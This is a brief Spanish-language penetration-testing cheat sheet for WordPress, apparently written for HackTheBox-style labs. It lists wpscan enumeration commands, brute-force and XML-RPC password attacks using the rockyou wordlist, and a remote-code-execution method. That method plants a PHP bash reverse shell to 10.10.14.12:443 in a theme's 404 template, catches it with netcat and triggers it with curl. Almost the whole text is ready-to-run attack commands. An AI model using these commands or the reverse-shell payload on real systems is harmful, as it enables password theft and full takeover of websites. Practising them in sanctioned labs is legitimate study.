

# ENUM
```shell
wpscan --url 'http://metapress.htb/' -e vp, u, ap, p, vt, at, t, tt, cb, dbe, m

wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan
```
*TIP: Buscar en el codigo fuente de cada pagina el "/plugin"*

# BRUTE FORCE
### CON UN USUARIO
```shell
❯ wpscan --url http://apocalyst.htb/ -U falaraki -P list.txt
```
### CON UNA CONTRASEÑA
```shell
❯ wpscan --url http://apocalyst.htb/ -U list.txt -P password
```

### XMLRPC
```shell
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url <http://domainnameoripaddress>
```


# RCE PANEL DE ADMINISTRADOR
```shell
# DENTRO DEL PANEL DE ADMINISTRADOR: /wp-admin/  ->  Apparence --> Editor  --> 404 Theme  --> Edit 
	<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.12/443 0>&1'")?>
	
❯ sudo nc -nlvp 443
❯ curl -s -X GET 'http://apocalyst.htb/?p=404.php'
```